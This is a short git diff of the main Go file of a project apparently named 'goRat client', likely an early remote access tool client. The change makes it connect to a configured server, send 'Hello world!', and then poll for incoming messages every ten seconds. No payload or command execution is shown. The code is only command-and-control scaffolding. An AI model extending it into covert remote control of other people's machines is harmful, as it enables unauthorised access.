@@ -2,9 +2,10 @@ package main
 
 import (
 	"fmt"
+	"time"
 
 	"github.com/viher3/gorat-client/config"
-	"github.com/viher3/gorat-client/network"
+	"github.com/viher3/gorat-client/network/socket"
 )
 
 func main() {
@@ -13,5 +14,19 @@ func main() {
 	fmt.Println("### goRat client v"+conf.Version, "###")
 	fmt.Println("############################")
 
-	network.ConnectToServer(conf)
+	conn, err := socket.ConnectToServer(conf)
+
+	if err != nil {
+		fmt.Println("Error connecting to server:", err)
+		return
+	}
+
+	socket.SendMessage(conn, "Hello world!")
+	//socket.CloseConnection(conn)
+
+	for {
+		timeToWait := 10
+		fmt.Println("Waiting " + fmt.Sprint(timeToWait) + " seconds before cheking incomming messages ...")
+		time.Sleep(time.Duration(timeToWait) * time.Second)
+	}
 }
